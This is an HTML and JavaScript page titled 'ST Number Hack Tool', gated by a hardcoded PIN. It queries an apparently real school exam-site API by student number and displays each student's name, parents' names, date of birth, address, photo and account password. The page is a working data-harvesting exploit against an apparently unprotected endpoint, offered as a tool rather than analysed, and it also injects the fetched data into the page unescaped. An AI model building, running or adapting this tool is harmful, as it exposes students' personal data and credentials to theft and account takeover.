<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ST Number Search - Hacking Interface</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #000; /* Black background */
            color: #00ff00; /* Green text for terminal feel */
            margin: 0;
            padding: 20px;
            display: none; /* Hide body initially */
            flex-direction: column;
            align-items: center;
        }

        /* Modal styles */
        #pinModal {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.9);
            color: #00ff00;
            z-index: 1000;
        }

        input[type="password"], input[type="text"] {
            padding: 10px;
            border: 1px solid #00ff00; /* Green border */
            border-radius: 4px;
            margin-bottom: 10px;
            font-size: 16px;
            background: #222; /* Dark background */
            color: #00ff00; /* Green text */
        }

        button {
            background-color: #00cc00; /* Darker green */
            color: white;
            border: none;
            padding: 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background-color: #009900; /* Darker on hover */
        }

        h1 {
            color: #00ff00;
            margin-bottom: 20px;
            text-align: center;
        }

        #loading {
            width: 80%;
            height: 20px;
            background: rgba(0, 204, 0, 0.2);
            display: none; /* Hide initially */
            margin-top: 10px;
            border: 1px solid #00ff00; /* Green border */
            border-radius: 4px;
            overflow: hidden; /* Prevent overflow */
        }

        #loadingBar {
            height: 100%;
            width: 0;
            background: linear-gradient(to right, #00ff00, #007700);
            position: absolute;
            top: 0;
            left: 0;
            animation: loadingAnimation 2s linear forwards;
        }

        @keyframes loadingAnimation {
            from { width: 0; }
            to { width: 100%; }
        }

        #result {
            display: none; /* Hide initially */
        }
    </style>
</head>
<body>

    <h1>ST Number Hack Tool</h1>
    <form id="searchForm">
        <label for="stNumber">Enter ST Number:</label>
        <input type="text" id="stNumber" required>
        <button type="submit">Execute</button>
    </form>

    <div id="loading" style="display: none;">
        <div id="loadingBar"></div>
    </div>

    <div id="result"></div>

    <div id="pinModal">
        <h2>Enter PIN to Access</h2>
        <input type="password" id="pinInput" placeholder="Enter PIN">
        <button id="pinSubmit">Submit</button>
    </div>

    <script>
        const correctPin = "10B";

        // Show the modal on page load
        document.addEventListener('DOMContentLoaded', () => {
            document.body.style.display = 'none'; // Ensure body is hidden initially
            document.getElementById('pinModal').style.display = 'flex'; // Show PIN modal
        });

        document.getElementById('pinSubmit').addEventListener('click', function() {
            const enteredPin = document.getElementById('pinInput').value;
            if (enteredPin === correctPin) {
                document.getElementById('pinModal').style.display = 'none';
                document.body.style.display = 'flex'; // Show the body content
            } else {
                alert('Incorrect PIN. Please try again.');
            }
        });

        document.getElementById('searchForm').addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent the default form submission

            const stNumber = document.getElementById('stNumber').value;
            const url = `https://dextroexam.com/STFRANCISB/API/profile.php?Gr_num=${stNumber}`;
            const loadingDiv = document.getElementById('loading');
            const loadingBar = document.getElementById('loadingBar');

            // Show loading bar
            loadingDiv.style.display = 'block';
            loadingBar.style.width = '0'; // Reset width for new loading
            loadingBar.style.animation = 'none'; // Stop the animation for reset
            setTimeout(() => {
                loadingBar.style.animation = 'loadingAnimation 2s linear forwards'; // Start loading animation
            }, 10);

            try {
                const response = await fetch(url);
                if (!response.ok) throw new Error('Network response was not ok');

                const jsonData = await response.json();
                displayData(jsonData); // Call function to display data

            } catch (error) {
                console.error('Error fetching data:', error);
                alert('Error fetching data. Please check the ST number and try again.');
            } finally {
                loadingDiv.style.display = 'none'; // Hide loading bar after data is fetched
            }
        });

        function displayData(jsonData) {
            const resultDiv = document.getElementById('result');

            if (jsonData && jsonData.data) {
                const data = jsonData.data;
                resultDiv.innerHTML = `
                    <h2>Info...</h2>
                    <p><strong>Name:</strong> ${data.Name}</p>
                    <p><strong>ST Number:</strong> ${data.Gr_num}</p>
                    <p><strong>Father's Name:</strong> ${data.f_name}</p>
                    <p><strong>Mother's Name:</strong> ${data.m_name}</p>
                    <p><strong>Gender:</strong> ${data.gender}</p>
                    <p><strong>DOB:</strong> ${data.DOB}</p>
                    <p><strong>Password:</strong> ${data.pass_word}</p>
                    <p><strong>Address:</strong> ${data.address}</p>
                    <img src="${data.student_img}" alt="Student Image">
                `;
                resultDiv.style.display = 'block'; // Show the result
            } else {
                resultDiv.innerText = "No data available.";
            }
        }
    </script>

</body>
</html>
